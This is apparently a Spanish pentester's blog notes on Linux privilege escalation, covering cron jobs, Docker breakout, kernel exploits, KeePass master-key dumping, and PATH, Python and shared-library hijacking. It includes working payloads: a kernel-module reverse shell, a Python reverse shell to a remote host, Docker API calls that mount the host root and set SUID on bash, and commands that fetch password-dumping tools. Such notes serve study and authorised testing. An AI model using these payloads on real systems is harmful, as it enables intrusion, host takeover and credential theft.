<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>Una tarea cron es una tarea programada en sistemas Unix/Linux que se ejecuta en un momento determinado o en intervalos regulares de tiempo. Estas tareas se definen en un archivo crontab que especifica qué comandos deben ejecutarse y cuándo deben hacerlo.<br>La detección y explotación de tareas cron es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Por ejemplo, si un atacante detecta que un archivo está ejecutado por el usuario "root" a través de una tarea cron que se ejecuta a intervalos regulares de tiempo, y se da cuenta de que los permisos definidos en el archivo están mal configurados, podría manipular el contenido del mismo para incluir instrucciones maliciosas las cuales serían ejecutadas de forma privilegiada como el usuario 'root', dado que corresponde al usuario que está ejecutando dicho archivo. <br>Para detectar tareas cron, los atacantes pueden utilizar <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> como Pspy. Pspy es un herramienta de línea de comandos que monitorea las tareas que se ejecutan en segundo plano en un sistema Unix/Linux y muestra las nuevas tareas que se inician.<br><br>
<br>


<br>


<br>


<br>


<br><br>Para detectar tareas cron podríamos crearnos un propio script como así también hacer uso de Pspy, ambas maneras son validas ya que la finalidad de esto es detectar tareas que se ejecutan en segundo plano para de esta manera terminar dando con tareas cron que se pudiesen estar ejecutando en el sistema.<br>Para listar tareas cron también podemos usar el comando crontab -l (Esto solo lista las tareas cron del usuario en uso, por lo que tareas cron de otro usuario no nos saldrían), para ver más tareas cron podríamos hacerlo en la ruta /etc/cron.d pero en esta ruta tampoco tiene por que estar todas las tareas cron a nivel de sistema <br><br>#!/bin/bash

function ctrl_c(){
	echo -e "\n\n\t[!] Quiting....\n\n"
	exit 1 
}

trap ctrl_c SIGINT

old_process=$(/usr/bin/ps -eo user,command)

while true; do
	new_process=$(/usr/bin/ps -eo user,command)
	diff &lt;(echo "$old_process") &lt;(echo "$new_process") | grep "[\&gt;\&lt;]" | grep -vE "kworker|{nombre_script}|command"
	old_process=$new_process
done 

Copy<br><br>Una vez localizadas las tareas cron que pudiesen estar corriendo por el sistema, solo queda ver si puede llegar a ser vulnerable para posteriormente explotarlas.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/detección-y-explotación-de-tareas-cron.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Detección y explotación de tareas Cron.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 10 Jun 2024 13:13:05 GMT</pubDate></item><item><title><![CDATA[Docker Breakout]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>El termino docker breakout hace referencia a la posibilidad que tiene un usuario legitimo o un atacante de escapar del container en el cual se encuentra, pudiendo así ganar acceso a la maquina host la cual ejecuta el container. Para realizar esto pueden existir diversas situaciones, algunas de ellas son: <br>
<br>


<br>


<br>


<br>


<br><br><br><br>Cuando hacemos docker ps o docker images, se comunica con un archivo alojado en la ruta /var/run/docker.sock el cual es un socket file que nos permite comunicarnos con el demonio de docker cuando el servicio esta activo para poder ver la información deseada. <br>Cual es el problema de esto? En principio ninguno, pero muchas veces en entornos de desarrollo por diversos motivos, cuando se crea un contenedor se necesita que el mismo tenga docker así como acceso a las imágenes creadas y los contenedores, por lo que muchas veces cuando se crea el contenedor de docker se suele hacer una montura de todo lo que existe en la ruta /var/run/docker.sock con la ruta del contenedor /var/run/docker.sock.<br>
(docker run -v /var/run/docker.sock:/var/run/docker.sock ......)<br>Por lo que el contenedor con docker (apt install docker.io) al realizar un docker ps o docker images podrá listar los contenedores y las imagenes de la maquina host (Por lo que podría verse a si mismo con docker ps), en lugar de recibir un error debido a que no se reconoce el servicio de docker y no se puede comunicar con la ruta /var/run/docker.sock (Que es lo que pasa en caso de que no se realice esta montura). <br>De esta manera, tenemos una ruta (/var/run/docker.sock) que pertenece a la maquina host y al ser la ruta que permite comunicarnos con el servicio de docker para listar imágenes, crear contenedores, etc. podemos jugar con monturas para llevar a cabo el docker breakout. <br>docker run -dit --name breakout -v /:/mnt/root {image_name} Con este comando, haciendo uso de una imagen disponible, estaríamos creando un nuevo contenedor con una montura de toda la raíz del sistema host en la ruta /mnt/root, por lo que de esta manera ya tendríamos acceso al sistema completo dentro de dicha ruta. <br><br><br><br>Cuando nos encontramos en un contenedor el cual fue creado con la flag --pid=host indica que si ejecutamos un ps -faux podemos ver los procesos de la maquina host, esto supone un riesgo ya que podríamos hacer uso de un PID de una tarea que ejecuta root para inyectar un shellcode para que nos cree un subproceso a partir del proceso, por lo que podríamos establecer una de las <a data-href="Shells" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html" class="internal-link" target="_self" rel="noopener nofollow">Shells</a> (Bind Shell) mediante un shellcode (Siempre y cuando el contenedor tenga los permisos). <br>Si buscamos en google un script que establezca un <a data-tooltip-position="top" aria-label="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" rel="noopener nofollow" class="external-link" href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" target="_blank">shellcode mediante un proceso corriendo</a> , podríamos utilizarlo para editarlo haciendo uso de otros shellcodes para establecer una tarea que querramos, por ejemplo un <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/41128" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/41128" target="_blank">shellcode para establecer una bind shell por el puerto 5600</a>.<br>De esta manera, una vez editado el shellcode (Modificando los bytes del shellcode y el shellcode mismo), simplemente podríamos compilar el binario y si tenemos los permisos necesarios, podríamos ejecutar el mismo el cual se encargara de crear un subproceso a través del proceso seleccionado, por lo que si todo sale bien se abrirá en el puerto 5600 un bind shell para que con netcat nos podamos conectar (nc {target_ip} 5600) y tener acceso como root a la maquina host. <br><br><br>Portainer es una herramienta que permite la administración y gestión de manera centralizada local o remota de docker, sean imagenes, contenedores, etc. Esta herramienta cuenta con un panel administrativo el cual en algunos casos podríamos encontrar en alguna máquina que estemos intentando vulnerar, por lo que podríamos realizar un ataque de fuerza bruta para ver si encontramos la contraseña y logramos ingresar al panel administrativo, de esta manera, una vez con acceso al panel administrativo, podríamos ver las imagenes y hacer uso de estas para crear un contenedor haciendo uso de esta y ver si existe la posibilidad de escapar del mismo, o incluso, realizar lo mismo que cuando el demonio de docker esta enlazado, ya que para que portainer tenga acceso a la información de las imagenes y demás tiene que poder ver el demonio de docker, y muchas veces este se monta en el contenedor de la sig. manera: docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce  <br>Por lo que si obtenemos acceso al panel administrativo de portainer y creamos un contenedor haciendo uso de una imagen con la montura de /:/mnt/root una vez más, dentro de la ruta /mnt/root* tendríamos acceso al sistema, y esto abre una amplia variedad de posibilidades. <br><br><br>Esto es algo que por default no suele estar activado, pero muchas veces puede ser que nos encontremos con esto.<br>
Para activar la API de Docker, nos dirigimos al directorio /etc/docker y creamos un archivo llamado daemon.json con el contenido: <br>{"hosts": ["tcp://0.0.0.0:2375", "unix:///var/run/docker.sock"]}
Copy<br>Agregamos el archivo /etc/systemd/system/docker.service.d/override.conf : <br>[Service]
ExecStart= 
ExecStart=/usr/bin/dockerd
Copy<br>Y por ultimo recargamos el demonio  systemctl daemon-reload y restartiamos el servicio de docker systemctl restart docker.service. <br>Una vez que tengamos la API corriendo ya podríamos probar esto de manera local. <br>Cuando ganamos acceso a un contenedor y probamos diversas maneras de intentar escapar del contenedor, tal vez ninguna de las anteriores den resultado. Por lo que podríamos verificar si el puerto 2375 o 2376 esta abierto en lo que sería la maquina host.<br>Por ejemplo, si somos la máquina 172.17.0.2 intuimos que la máquina host es la 0.1 por lo que podríamos verificar si uno de los puertos anteriores está abierto.<br>echo '' &gt; /dev/tcp/172.17.0.1/2375 

echo $? 
Copy<br>Si no vemos respuesta alguna en la consola y al ejecutar echo $? vemos que el código de estado es un 0, quiere decir que el puerto esta abierto, por lo que muy probablemente este corriendo docker. En este caso, podríamos realizar el proceso de enumeración y creación de contenedores haciendo uso de páginas como <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker" target="_blank">HackTricks</a>. <br><br>
<br>Listar containers desde consola con CURL usando la API: curl http://{ip}:2375/containers/json | jq
<br>Listar imágenes  desde consola con CURL usando la API: curl http://{ip}:2375/images/json | jq
<br>Listar containers desde consola con CURL usando la API: curl http://{ip}:2375/containers/json | jq
<br>Crear un container curl  -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/create?name={container_name} -d '{"Image":"{image_name}", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt/root" ], "Privileged": true}' (Esto nos devolverá un ID_container)
<br>Startear el container creado: curl -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/{ID_container}/start?name={container_name}
<br>Crear ejecución de un comando: curl -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/{ID_container}/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/root/bin/bash"]}' (Esto nos devolverá un ID_command y en caso de que el comando que querramos ejecutar sea algo lo cual nos tenga que mostrar output como un cat al /etc/shadow deberíamos agregar un --ouput -)
<br>Ejecutar el comando creado: curl -X POST -H "Content-Type: application/json" http://{ip}:2375/exec/{ID_command}/start -d '{}' 
<br>De esta manera, si vemos que la API de docker esta activa en la máquina host, podríamos crear un contenedor como lo haríamos normalmente desde consola y manipular el contenido de la máquina host, pudiendo leer el etc/shadow, agregando el permiso SUID a la bash, etc. <br><br><br>En caso de ejecutar un linpeas.sh, o listar de manera manual las capabilities con capsh --print y localizar que el contenedor contiene la capabilitie sys_module, como resultado el contenedor puede insertar y/o remover modules del kerner en la máquina host del contenedor. <br>Una vez con la IP de la máquina host, haríamos uso del siguiente script en c.<br>#include &lt;linux/kmod.h&gt;
#include &lt;linux/module.h&gt;
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
static int __init reverse_shell_init(void) {
return call_usermodelhelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
Copy<br>Ahora habría que crear un archivotarget makefile:<br>obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
Copy<br>Ejecutamos el comando make, luego podríamos proceder a ponernos en escucha por el puerto aclarado en la máquina host (O donde querramos envíar la reverse shell).<br>Ejecutamos el comando insmod reverse-shell.ko, y al hacerlo se ejecutaría el comando ingresado, en este caso en las primeras líneas del archivo c se indicio `/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1']]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/docker-breakout.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Docker Breakout.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 27 Feb 2024 19:06:27 GMT</pubDate></item><item><title><![CDATA[Explotación del Kernel]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>El Kernel es la parte central del sistema operativo Linux, que se encarga de administrar los recursos del sistema, como la memoria, los procesos, los archivos y los dispositivos. Debido a su papel crítico en el sistema, cualquier vulnerabilidad en el kernel puede tener graves consecuencias para la seguridad del sistema.<br>En versiones antiguas del kernel de Linux, se han descubierto vulnerabilidades que pueden ser explotadas para permitir a los atacantes obtener acceso de superusuario (root) en el sistema. <br>La elevación de privilegios se refiere a la técnica utilizada por los atacantes para obtener permisos elevados en el sistema, como superusuario, cuando solo tiene permisos limitados. Por ejemplo, un usuario con permisos limitados en el sistema podría utilizar una vulnerabilidad en el kernel para obtener acceso de superusuario y , posteriormente, comprometer el sistema. <br>Las vulnerabilidades del kernel pueden ser explotadas de varias maneras. Por ejemplo, un atacante podría aprovechar una vulnerabilidad en un controlador de dispositivo para obtener acceso al kernel y realizar operaciones maliciosas. Otra forma común en que se explotan las vulnerabilidades del kernel es mediante el uso de técnicas de desbordamiento de búfer, que permiten a los atacantes escribir código malicioso en áreas de memoria reservadas para el kernel.<br><br>Para explotar vulnerabilidades de Kernel, con el comando uname -a podemos ver la versión del kernel y con esta, junto a googlear y usar herramientas como searchsploit o linux-exploit-suggester para buscar exploits para dichar versión.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/explotación-del-kernel.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Explotación del Kernel.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:03 GMT</pubDate></item><item><title><![CDATA[Keepass master key crack .dmp]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><a rel="noopener nofollow" class="external-link" href="https://dobliuw.com" target="_blank"></a>-----<br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br><br><br><br><br>En versiones anterior a 2.54 en KeePass es posible recuperar en texto claro la contraseña maestra a raiz de un MemoryDump (.dmp). <a data-tooltip-position="top" aria-label="https://github.com/keepassxreboot/keepassxc/discussions/9433" rel="noopener nofollow" class="external-link" href="https://github.com/keepassxreboot/keepassxc/discussions/9433" target="_blank">CVE-2023-32784</a><br>De esta manera, podríamos hacer uso de la herramienta <a data-tooltip-position="top" aria-label="https://github.com/vdohney/keepass-password-dumper/blob/main/README.md" rel="noopener nofollow" class="external-link" href="https://github.com/vdohney/keepass-password-dumper/blob/main/README.md" target="_blank">keepass-password-dumper</a> para mediante un archivo .dmp lograr extraer en texto claro la contraseña maestra. <br><br>git clone https://github.com/vdohney/keepass-password-dumper/tree/main
cd keepass-password-dumper

dotnet run {path_to_.dmp_file}
Copy<br>Una vez ejecutado este comando, se volcara en texto claro la contraseña maestra. Aunque es de suma IMPORTANCIA tener en cuenta que el primer caracter no será recuperado (Por lo que deberíamos descurbrirlo) así como también es  importante tener en cuenta que en algunos casos puede ser que en diversas posiciones de la contraseña haya múltiples caracteres siendo estos posibles de cara a la contraseña maestra.<br>Si lo queremos hacer desde linux es imporatante tener en cuneta que podemos visitar PoC como el de <a data-tooltip-position="top" aria-label="https://github.com/CMEPW/keepass-dump-masterkey" rel="noopener nofollow" class="external-link" href="https://github.com/CMEPW/keepass-dump-masterkey" target="_blank">keepass-dump-masterkey</a>.<br><br>wget https://raw.githubusercontent.com/CMEPW/keepass-dump-masterkey/main/poc.py

python3 poc.py -d {path_to_.dmp_file}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/keepass-master-key-crack-.dmp.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Keepass master key crack .dmp.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:04 GMT</pubDate></item><item><title><![CDATA[PATH Hijacking]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>PATH Hijacking es una técnica utilizada por los atacantes para secuestrar comandos de un sistema Unix/Linux mediante la manipulación del PATH. El PATH es una variables de entorno que define las rutas de búsqueda para los archivos ejecutables en el sistema.<br>En algunos binarios compilados, algunos de los comandos definidos internamente pueden ser indicados con una ruta relativa en lugar de una ruta absoluta. Esto significa que el binario busca los archivos ejecutables en las rutas especificadas en el PATH, en lugar de utilizar la ruta absoluta del archivo ejecutable.<br>Si un atacante es capaz de alterar el PATH y crear un nuevo archivo con el mismo nombre de uno de los comandos definidos internamente en el binario, puede lograr que el binario ejecuta la versión maliciosa del comando en lugar de la versión legítima.<br>Por ejemplo, si un binario compilado utiliza el comando "ls" sin su ruta absoluta en su código y el atacante crea un archivo maliciosos llamado "ls" en una de las rutas especificadas en el PATH, el binario ejecutará el archivo malicioso en lugar del comando legítimo "ls" cuando sea llamado.<br><br>Para prevenir el PATH Hijacking, se recomienda utilizar rutas absolutas en lugar de rutas relativas en los comandos definidos internamente en los binarios compilados. Además, es importante asegurarse de que las rutas en el PATH sean controladas y limitadas a las rutas necesarias para el sistema. También se recomienda utilizar la opción de permisos de ejecución para los archivos ejecutables solo para los usuarios y grupos autorizados. <br><br>Para escalar los privilegios del usuario actual mediante el empleo de un PATH Hijacking lo que deberíamos hacer es intentar abusar de un binario mal programado el cual debería ejecutar algún comando a nivel de sistema pero SIN hacerlo de forma absoluta, es decir, en lugar de indicar por ejemplo /usr/bin/whoami lo hace como whoami. <br>Por ejemplo, si tuviéramos un script en Go el cual se ve de la siguiente manera: <br>#include &lt;stdio.h&gt;

int main(){
	setuid(0);
	printf("Este programa sirve para indicarnos que usuario somos"); 
	printf("\n\n\t[!] Actualmente somos el usuario: "); 
	system("whoami")
	return 0; 
}
Copy<br>El cual es compilado gcc {file.c} -o {binario} y se le dan permisos SUID chmod u+s {binario}. <br>Si bien no sabríamos de primeras que se esta ejecutando un comando sin su ruta absoluta y a la vez no disponemos del archivo inicial .c que compila posteriormente el binario para ver que hace por detrás el binario ni podemos ver el contenido del mismo con cat por ser un precisamente un binario, podemos hacer uso de strings para ver si (Intuyendo que se ejecuta un whoami debido a que el programa parece indicarnos con que usuario estamos ) existe alguna string relacionado al comando whoami, ya sea la ruta absoluta o el mismo whoami<br>Si al hacer strings {bibario} | grep "whoami" vemos la cadena "whoami", quiere decir que se podría estar ejecutando el comando whoami sin su ruta absoluta, lo que podría derivar en un PATH Hijacking. <br>Para hacer esto, simplemente deberíamos crear un binario llamado como el comando que se ejecuta sin su ruta absoluta (En este caso whoami) en un directorio con permisos de escritura, para posteriormente modificar la variable de entorno PATH para indicar que la primera ruta de búsqueda de los binarios es en dicho directorio donde depositamos nuestro comando maliciosos<br>cd /tmp 

touch whoami 

echo "bash -p" &gt; whoami 

export PATH=/tmp/:$PATH
Copy<br>Una vez modificado el path, deberíamos volver a ejecutar el binario inicial para que a la hora de llegar a la línea en donde ejecuta el comando "whoami" al tener el path modificado indicando que se tiene que buscar todo binario indicado sin su ruta absoluta en primer lugar en el path "/tmp", al dirigirse a esta en busca del binario whoami el mismo sea hallado y ejecutado, dando como resultado el lanzamiento de una bash con privilegios (Ya que el binario tenía permisos SUID)]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/path-hijacking.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/PATH Hijacking.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:04 GMT</pubDate></item><item><title><![CDATA[Python Library Hijacking]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>Cuando hablamos de Python Library Hijacking, a lo que nos referimos es a una técnica de ataque que aprovecha la forma en la que Python busca y carga bibliotecas para inyectar código maliciosos en un script. El ataque se produce cuando un atacante re o modifica una biblioteca en una ruta accesible por el script de Python, de tal manera que cuando el script la importa, se carga la versión maliciosa en lugar de la legítima. <br>La forma en que el ataque se lleva a cabo es la siguiente: el atacante busca una biblioteca utilizad por el script y la reemplazas por su propia versión maliciosa. Esta biblioteca puede ser una biblioteca estándar de Python o una biblioteca externa descargada e instalada por el usuario. El atacante coloca  su versión maliciosa en una ruta accesible antes que la biblioteca legítima sea encontrada.<br>En genera, Python comienza buscando estas bibliotecas en el directorio actual de trabajo y luego en las rutas definidas en la variable sys.path. Si el atacante tiene acceso de escritura en alguna de las rutas definidas en sys.path, puede colocar allí su propia versión maliciosa de la biblioteca y hacer que el script cargue en lugar de la legítima.<br>Además, el atacante también puede crear su propia biblioteca en el directorio actual de trabajo, ya que Python comienza la búsqueda en este directorio por defecto. Si durante la carga de estas librerías desde el script legítimo, el atacante logra secuestrarlas, entonces conseguirá una ejecución alternativa del programa. <br><br>Supongamos que estamos en un sistema con el usuario dobliuw (El cual tenemos en poder) y otro usuario con mayores privilegios llamado admin, en el archivo de /etc/sudoers esta declarada la sentencia dobliuw ALL=(admin)  NOPASSWD: /usr/bin/python3 /home/admin/myFirstScript.py, lo cual al hacer sudo -l como el usuario dobliuw vemos que podemos ejecutar un script llamado myFirstScript.py como el usuario admin sin  proporcionar contraseña con python3. <br>El script es algo básico como lo siguiente: <br>#!/usr/bin/python3
import time, hashlib, signal, sys

def ctrl_c(sig, frame):
	print("\n\n\t[!] Quiting...\n\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c) 

def main():
	name = str(input("Please insert your name: "));
	time.sleep(2)
	print("\n\n\t[!] Oh I understand now... Hello {} ({})\n\n".format(name,hashlib.md5(name.encode()).hexdigest()))


if __name__ == "__main__":
	main()
Copy<br><br>En este momento es cuando, en caso de tener permiso de escritura en el directorio en el cual se encuentra el script (/home/admin) o tenerlo en alguna de las carpetas en donde python busca las librerías (python3 -c 'import sys; print(sys.path)' para ver los paths) o incluso teniendo permisos de escritura en alguna de las librerías que se importa el script, en este caso hashlib, signal, etc. podríamos acontecer un Python Library Hijacking.<br>Por ejemplo podríamos crear el script (En la carpeta de trabajo o alguna de las otras), o incluso modificar la librería original para ingresar código malicioso que ejecute alguna acción, por ejemplo espawnear una consola como el usuario administrador aprovechando que podemos ejecutar el script como dicho usuario gracias a los permisos SUID, o enviarla a un equipo remoto, etc.<br><br># Spawnear una consola como el usuario admin
import os

os.system("bash -p")

#############################################3

# Enviar una reverse shell como el usuario admin a un dispositivo remoto 
import subprocess

subprocess.Popen(["bash -c 'bash -i &amp;&gt;/dev/tcp/{ip}/{port} 0&gt;&amp;1'"], shell=True)
Copy<br>Una vez teniendo el código malicioso en un nuevo archivo en el directorio de trabajo con el nombre de una de las librerías importadas en el script original, o habiendo modificado la librería real bastaría con ejecutar el script como el usuario admin aprovechando los permisos garantizados en el archivo de sudoers y tendríamos la ejecución de los comandos deseados.  sudo -u admin /usr/bin/python3 /home/admin/myFirstScript.py ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/python-library-hijacking.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Python Library Hijacking.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:04 GMT</pubDate></item><item><title><![CDATA[Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>Las bibliotecas compartidas son archivos que contiene funciones y recursos utilizados por múltiples programas. Cuando un programa requiere una función de una biblioteca compartida, el sistema operativo busca la biblioteca y enlaza dinámica mente la función requerida durante la ejecución del programa. Sin embargo, si el sistema no encuentra la biblioteca en las rutas predeterminadas, puede buscarla en otros directorios. <br>Un atacante puede aprovechar esta situación creando una biblioteca compartida maliciosa con el mismo nombre que la biblioteca legítima y colocándola en un directorio donde el sistema la buscará. Cuando el programa intenta cargar la biblioteca, el sistema cargara la versión malicioso en lugar de la legítima, permitiendo al atacante ejecutar código malicioso con los privilegios del programa víctima. <br><br>Para ver las funciones que se usan en un script de una biblioteca de objetos compartida podríamos hacer uso del comando ldd o de de un script llamado <a data-tooltip-position="top" aria-label="https://github.com/namhyung/uftrace" rel="noopener nofollow" class="external-link" href="https://github.com/namhyung/uftrace" target="_blank">uftrace</a> (Utilizado para analizar la ejecución de un programa escrito en C/C++) para leer las mismas...<br>ldd {binary}

uftrace --force -a {binary}
